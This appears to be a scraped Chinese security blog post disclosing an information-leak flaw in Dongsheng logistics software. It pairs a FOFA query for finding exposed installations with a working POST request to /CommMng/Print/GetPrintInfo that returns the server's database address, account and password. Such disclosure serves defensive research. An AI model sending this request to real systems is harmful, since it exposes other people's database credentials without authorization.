---
title: "东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞"
source: https://mrxn.net/jswz/dongsheng-CommMng-Print-GetPrintInfo-dbstr.html
asset_dir: assets/东胜物流软件-commmngprintgetprintinfo-信息泄露漏洞
---

# 东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/11 08:31
* 408浏览
* [2评论](#comment)
* 13分钟阅读

深入探索

数据管理

数据库

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

东胜物流软件是一款用于物流管理的系统，旨在提供高效的物流操作和数据管理功能。在该软件的 `/CommMng/Print/GetPrintInfo` 接口中存在一个信息泄露漏洞。攻击者可以利用此漏洞，未经授权地获取系统的数据库配置信息，包括但不限于数据库的IP地址、端口、账户名以及密码等敏感数据。这可能导致数据库遭到进一步的恶意访问，从而造成数据[泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)、篡改或对系统造成更深层次的破坏。

物流软件安全

# 影响版本

# fofa语法

> (body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css") && body="东胜"

# 漏洞分析

根据.NET MVC框架特点找到DSWeb.CommMng中对于路由的定义

```
using System.Web.Mvc;

#nullable disable
namespace DSWeb.Areas.CommMng;

public class CommMngAreaRegistration : AreaRegistration
{
  public override string AreaName => "CommMng";

  public override void RegisterArea(AreaRegistrationContext context)
  {
    context.MapRoute("CommMng_default", "CommMng/{controller}/{action}/{id}", (object) new
    {
      action = "Index",
      id = UrlParameter.Optional
    });
  }
}
```

在DSWeb.CommMng.Controllers下找到**PrintController**里的**GetPrintInfo()**方法

[![东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞](images/img-001-64f10077a85b.webp)](https://image.mrxn.net/8366829df32e47db8d3b19fbee6299f2.webp)

[![东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞](images/img-002-00c5717714f3.webp)](https://image.mrxn.net/184a1816521a46f1af8315d65bd732cc.webp)

1. `SqlHelper.ConnectionStringLocalTransaction` 包含数据库连接字符串（通常含服务器地址、用户名、密码）
2. 当 `str2`（RemoteServer）不为空时，该连接字符串被序列化到 JSON 响应中
3. 响应直接返回给客户端：`return new ContentResult() { Content = str3 };`

# 漏洞复现

```
POST /CommMng/Print/GetPrintInfo HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/x-www-form-urlencoded

type=test&sql1=&sql2=&sql3=&sql4=&sql5=&sql6=
```

[![东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞](images/img-003-773655fe5026.webp)](https://image.mrxn.net/1b95b042b1314465a1e8baea3d33631b.webp)

成功在响应回显数据库连接信息如ip地址、端口、账户、密码等敏感信息。

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)
* [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞](https://mrxn.net/jswz/dongsheng-CommMng-Print-GetPrintInfo-dbstr.html)  
文章链接：<https://mrxn.net/jswz/dongsheng-CommMng-Print-GetPrintInfo-dbstr.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-CommMng-Print-GetPrintInfo-dbstr.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全工具开发

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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